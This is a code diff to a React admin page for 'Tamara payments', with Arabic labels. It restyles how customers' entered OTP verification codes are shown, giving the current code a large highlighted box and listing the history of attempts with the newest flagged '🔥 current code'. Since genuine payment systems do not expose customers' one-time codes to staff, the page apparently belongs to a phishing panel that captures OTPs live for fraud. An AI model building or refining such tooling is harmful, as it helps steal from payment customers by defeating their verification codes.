@@ -321,9 +321,13 @@ const AdminTamaraPayments = () => {
                           <p className="text-sm text-gray-600">المبلغ الإجمالي</p>
                           <p className="font-bold text-lg">{payment.total_amount} ر.س</p>
                         </div>
-                        <div>
-                          <p className="text-sm text-gray-600">كود التحقق (OTP)</p>
-                          <p className="font-bold text-lg text-primary">{payment.otp_code || 'لم يتم إدخاله بعد'}</p>
+                        <div className="md:col-span-2">
+                          <p className="text-sm text-gray-600 mb-2">كود التحقق الحالي (OTP)</p>
+                          <div className="bg-primary/10 rounded-lg p-4 border-2 border-primary">
+                            <p className="font-bold text-2xl text-primary text-center">
+                              {payment.otp_code || 'لم يتم إدخاله بعد'}
+                            </p>
+                          </div>
                         </div>
                       </div>
 
@@ -366,19 +370,51 @@ const AdminTamaraPayments = () => {
                       {/* محاولات OTP المتعددة */}
                       {payment.otp_attempts && payment.otp_attempts.length > 0 && (
                         <div className="mt-6 pt-6 border-t-2 border-gray-100">
-                          <p className="font-semibold text-lg mb-4">محاولات كود التحقق ({payment.otp_attempts.length})</p>
+                          <div className="flex items-center justify-between mb-4">
+                            <p className="font-semibold text-lg">سجل أكواد التحقق</p>
+                            <span className="bg-blue-100 text-blue-800 text-xs font-semibold px-3 py-1 rounded-full">
+                              {payment.otp_attempts.length} محاولة
+                            </span>
+                          </div>
                           <div className="space-y-3">
-                            {payment.otp_attempts.map((attempt, index) => (
-                              <div key={attempt.id} className="bg-gray-50 rounded-lg p-4">
-                                <div className="flex items-center justify-between">
-                                  <div>
-                                    <p className="font-medium text-sm">المحاولة {index + 1}</p>
-                                    <p className="text-gray-600 text-xs mt-1">{format(new Date(attempt.created_at), 'PPp', { locale: ar })}</p>
+                            {payment.otp_attempts.map((attempt, index) => {
+                              const isLatest = index === 0;
+                              return (
+                                <div 
+                                  key={attempt.id} 
+                                  className={`rounded-lg p-4 border-2 transition-all ${
+                                    isLatest 
+                                      ? 'bg-green-50 border-green-300' 
+                                      : 'bg-gray-50 border-gray-200'
+                                  }`}
+                                >
+                                  <div className="flex items-center justify-between">
+                                    <div className="flex-1">
+                                      <div className="flex items-center gap-2 mb-1">
+                                        <p className="font-medium text-sm">
+                                          {isLatest ? '🔥 الكود الحالي' : `الكود القديم #${payment.otp_attempts.length - index}`}
+                                        </p>
+                                        {isLatest && (
+                                          <span className="bg-green-600 text-white text-xs font-semibold px-2 py-0.5 rounded">
+                                            جديد
+                                          </span>
+                                        )}
+                                      </div>
+                                      <p className="text-gray-600 text-xs">
+                                        {format(new Date(attempt.created_at), 'PPp', { locale: ar })}
+                                      </p>
+                                    </div>
+                                    <div className="text-left">
+                                      <p className={`font-bold text-2xl ${
+                                        isLatest ? 'text-green-600' : 'text-gray-500'
+                                      }`}>
+                                        {attempt.otp_code}
+                                      </p>
+                                    </div>
                                   </div>
-                                  <p className="font-bold text-lg text-primary">{attempt.otp_code}</p>
                                 </div>
-                              </div>
-                            ))}
+                              );
+                            })}
                           </div>
                         </div>
                       )}
